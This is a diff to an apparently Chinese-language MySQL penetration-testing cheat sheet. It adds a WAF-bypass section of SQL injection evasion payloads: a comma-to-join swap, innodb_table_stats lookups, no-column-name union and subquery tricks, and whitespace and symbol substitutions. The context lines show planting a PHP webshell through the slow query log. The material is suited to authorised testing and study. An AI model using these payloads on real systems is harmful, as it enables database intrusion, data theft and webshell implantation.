@@ -7,11 +7,12 @@
     - [UDF(User Defined Function)提权](#udfuser-defined-function提权)
   - [Getshell](#getshell)
       - [直接写文件Getwebshell](#直接写文件getwebshell)
-      - [日志general_log Getshell](#日志general_log-getshell)
-      - [慢日志slow_query_logGetshell](#慢日志slow_query_loggetshell)
+      - [日志general\_log Getshell](#日志general_log-getshell)
+      - [慢日志slow\_query\_logGetshell](#慢日志slow_query_loggetshell)
+  - [WAF Bypass](#waf-bypass)
   - [mysql8](#mysql8)
     - [新增的表](#新增的表)
-      - [information_schema.TABLESPACES_EXTENSIONS](#information_schematablespaces_extensions)
+      - [information\_schema.TABLESPACES\_EXTENSIONS](#information_schematablespaces_extensions)
     - [新增功能](#新增功能)
       - [table](#table)
   - [参考](#参考)
@@ -158,9 +159,27 @@ set global slow_query_log=1;//开启慢查询
 set global slow_query_log_file='c:/www/webshell.php';//设置日志路径为web目录
 SELECT "phpinfo();"  or sleep(11);//使用sleep(11)使该语句记录到日志
 ```
-
+## WAF Bypass
+1. and -> %26(&)
+2. , -> join
+3. mysql版本大于5.6.x新增加的两个表**innodb_index_stats**和**innodb_table_stats**,主要是记录的最近数据库的变动记录,可用于代替informaiton_schema查询库名和表名.  
+```sql
+    select database_name from mysql.innodb_table_stats group by database_name;
+    select table_name from mysql.innodb_table_stats where database_name=database();
+```
+4. 无列名注入,将目标字段与已知值联合查询,利用别名查询字段数据
+```sql
+    select group_concat(`2`) from (select 1,2 union select * from user)x 
+```
+5. 无列名注入,利用子查询一个字段一个字段进行大小比较进行布尔查询
+```sql
+    select ((select 1,0)>(select * from user limit 0,1))
+```
+6. 空白字符:09 0A 0B 0D A0 20
+7. \`:select\`version\`();绕过空格和正则.
+8. 点(.):在关键字前加点,`select-id-1+3.from qs_admins;`
+9. @: `select@^1.from admins;`
 ## mysql8
-
 ### 新增的表
 #### information_schema.TABLESPACES_EXTENSIONS
 它直接存储了数据库和数据表
